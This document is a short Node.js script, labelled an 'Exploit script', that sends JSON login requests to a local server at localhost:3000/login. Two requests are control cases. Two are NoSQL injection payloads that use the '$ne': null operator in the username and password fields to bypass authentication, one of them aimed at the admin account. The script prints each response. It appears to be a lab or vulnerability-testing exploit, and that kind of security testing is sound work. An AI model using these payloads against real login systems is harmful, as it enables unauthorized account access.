const http = require('http');

const tests = [
  {
    name: 'Wrong password (control - should fail)',
    payload: { username: 'admin', password: 'wrongpassword' }
  },
  {
    name: 'Correct password (control - should succeed)',
    payload: { username: 'admin', password: 'admin123' }
  },
  {
    name: 'Generic injection (username and password as $ne)',
    payload: { username: { "$ne": null }, password: { "$ne": null } }
  },
  {
    name: 'Targeted injection (admin username, password as $ne)',
    payload: { username: 'admin', password: { "$ne": null } }
  }
];

function postJson(payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const options = {
      hostname: 'localhost',
      port: 3000,
      path: '/login',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
      timeout: 5000
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk.toString());
      res.on('end', () => resolve({ statusCode: res.statusCode, body }));
    });

    req.on('error', (err) => reject(err));
    req.on('timeout', () => { req.destroy(new Error('Request timed out')); });

    req.write(data);
    req.end();
  });
}

(async () => {
  console.log('=== Exploit script starting ===\n');

  for (const t of tests) {
    console.log(`-- Test: ${t.name}`);
    console.log('Request body:', JSON.stringify(t.payload));
    try {
      const res = await postJson(t.payload);
      console.log('Response code:', res.statusCode);
      console.log('Response body:', res.body);
    } catch (err) {
      console.error('Request error:', err.message || err);
    }
    console.log('-----\n');
  }

  console.log('=== Exploit script finished ===');
})();
